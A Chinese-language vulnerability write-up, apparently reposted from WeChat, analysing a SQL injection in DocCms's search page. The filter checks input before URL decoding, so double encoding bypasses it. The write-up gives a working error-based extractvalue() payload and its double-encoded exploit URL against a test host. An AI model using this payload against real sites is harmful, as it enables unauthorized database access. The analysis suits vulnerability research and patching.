> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ty3ORj4Gvs7Zmho63BCfvQ)

一、Cms 初识：

DocCms 用户操作界面清爽友好、后台使用简单便捷、模板模块儿开发制作快速灵活 三大优点！同时秉承永久免费开源的方针，继续为广大用户造福。

- 目录结构：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWE0XahmMdQFFpqTU8RPFQEsZ2vJVC2wkEpj3jHRx3c5yLwbPRPn9BexA/640?wx_fmt=png)

二、漏洞描述：

搜索页面由于程序对传参过滤不全，导致 SQL 关键字可以用双重 url 编码绕过，从而造成 SQL 注入。

三、漏洞分析过程：

定位到漏洞点：/search/index.php 中的 get_search_result() 函数：

首先接收到的传参会经过 checkSqlStr() 函数进行处理，然后再 url 解码：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWE37P3iaNV7qHp6kwvBEial22buN1oqzHOdU7qWxnmOr1KZGBPic7bOOrpQ/640?wx_fmt=png)

跟进 checkSqlStr() 函数：/inc/function.php

使用正则表达式匹配一些常见的 SQL 注入敏感字符，匹配到会返回 true，否则会返回 false，这里接收参数时，并没有第一时间去 url 解码，而是处理完之后才进行的解码，所以绕过方法就很简单了，双重 url 编码即可，编码后的内容正则就匹配不到了，所以就能绕过检测：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWEUJ8L2xFayzveN0T5xkfxeFYMzhgyHg57c6XySb5pucOl3gaC4uT7Jw/640?wx_fmt=png)

然后直接将 $keyword 拼接到 SQL 语句中，交给 get_results() 方法执行

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWEnrQFSUiajNMQDQ6W9FJ6q4HjEnNOJ40ibcC4bXia4lBx9YBuQ6hvwUtDw/640?wx_fmt=png)

跟进 get_results() 方法：/inc/class.database.php

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWE2BTiaekxDqNGXqsQcmHPdoYjN0TRLMvUic00ennulicKia842b1nc0m7yQ/640?wx_fmt=png)

继续跟进 query() 方法：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWEaMjbtO5M76LhbmvEGVg6edLv3Dk7WPxhAjjYz9A3ZVBkFviaqmTFFcg/640?wx_fmt=png)

执行错误会调用 print_error() 方法进行处理：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWEbL5VSHwtTO7Y4X1dZmCJc0hpxCGXnKT8K9ACqZHl20XV3FPhhNu7uA/640?wx_fmt=png)

执行出错会输出报错信息，所以就可以使用报错注入进行利用了。

四、漏洞利用：

访问漏洞 url：

```
http://www.doccms.test/search/index.php?keyword=1
```

在 keyword 处构造 payload：

```
' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```

进行两次的 url 编码：  

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWE4ncR8aR0ORaBOYicHRiaEb4MKBLJHWG6X2PZcBpX0edd1dibmib86LDW7w/640?wx_fmt=png)

最终 payload：

```
http://www.doccms.test/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33
```

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5SvG3miciaZhtRkhu3R0iapWEyh4E3OFMQU77RicOH9fqap9vVcZaeZwerfmUcj1oTuicIpLKxTOyKxqA/640?wx_fmt=png)